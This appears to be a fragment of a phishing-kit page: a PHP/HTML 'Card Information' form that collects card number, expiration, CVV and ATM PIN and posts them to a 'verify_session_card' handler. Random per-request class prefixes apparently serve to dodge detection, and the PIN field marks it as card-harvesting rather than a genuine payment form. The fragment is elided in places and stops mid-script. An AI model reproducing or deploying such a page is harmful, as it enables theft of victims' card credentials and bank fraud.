					...
					<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container container--fluid">
						<div data-v-282502d4="" id="content">
							<div data-v-5dcd7cb4="" data-v-282502d4="">
								<h1 data-v-5dcd7cb4="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> text-h4">Card Information</h1>
								<div data-v-2906dda8="" data-v-5dcd7cb4="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> row">
									<div data-v-2906dda8="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> col-md-5 col-lg-4 col">
										<form data-v-5dcd7cb4="" method="post" action="process/verify_session_card" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-form" data-v-2906dda8="">
												...
												<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
															...
															<input autocomplete="off" placeholder="Card Number" name="cnum" required="true" id="cnum" type="tel">
											...
											<div data-v-5dcd7cb4="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input theme--light v-text-field v-text-field--is-booted">
												<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
															<label for="input-76" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-label theme--light" style="left: 0px; right: auto; position: absolute;"></label>
															<input autocomplete="off" placeholder="Expiration(MM/YYYY)"   name="exp" required="true" id="exp" type="tel">
														...
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
																<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
																	...
																	<input autocomplete="new-password" name="cvv" required="true" placeholder="Cvv Code" id="cvv" maxlength="3" type="tel">
																</div>
													...
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
																...
																<input autocomplete="new-password" placeholder="ATM Pin" id="pin" name="pin" required="true" type="tel" maxlength="4">
															</div>
...
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
    ...
    <script>
        $('input[name="cnum"]').mask('0000 0000 0000 0000');
